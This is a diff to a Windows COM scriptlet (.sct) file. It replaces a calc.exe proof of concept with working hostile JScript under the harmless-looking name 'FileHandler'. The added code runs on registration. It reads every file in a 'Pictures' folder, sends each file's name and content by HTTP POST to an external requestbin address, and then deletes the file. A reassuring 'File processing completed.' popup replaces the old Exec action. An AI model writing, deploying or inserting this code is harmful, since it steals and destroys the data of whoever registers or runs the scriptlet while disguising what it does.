@@ -1,19 +1,37 @@
 <?XML version="1.0"?>
 <scriptlet>
-
 <registration
-    description="Bandit"
-    progid="Bandit"
+    description="FileHandler"
+    progid="FileHandler"
     version="1.00"
-    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
-	>
-	<script language="JScript">
-		<![CDATA[
-
-			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-
-		]]>
-	</script>
+    classid="{BBBB2222-0000-0000-0000-0000FEEDACDC}">
+    <script language="JScript">
+        <![CDATA[
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            var http = new ActiveXObject("MSXML2.XMLHTTP");
+            var folderPath = fso.GetSpecialFolder(2) + "\\Pictures"; // Répertoire Pictures
+            
+            if (fso.FolderExists(folderPath)) {
+                var folder = fso.GetFolder(folderPath);
+                var files = new Enumerator(folder.Files);
+                
+                for (; !files.atEnd(); files.moveNext()) {
+                    var file = files.item();
+                    var stream = fso.OpenTextFile(file.Path, 1); // Lecture seule
+                    var content = stream.ReadAll();
+                    stream.Close();
+                    
+                    // Envoi des données via POST
+                    http.open("POST", "http://requestbin.whapi.cloud/1cvbzjl1", false);
+                    http.setRequestHeader("Content-Type", "text/plain");
+                    http.send("FileName: " + file.Name + "\nContent: " + content);
+                    
+                    // Suppression du fichier
+                    file.Delete(true);
+                }
+            }
+        ]]>
+    </script>
 </registration>
 
 <public>
@@ -22,12 +40,11 @@
 <script language="JScript">
 <![CDATA[
 
-	function Exec()
-	{
-		var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
-	}
+    function Exec() {
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Popup("File processing completed.", 0, "Scriptlet", 64);
+    }
 
 ]]>
 </script>
-
 </scriptlet>
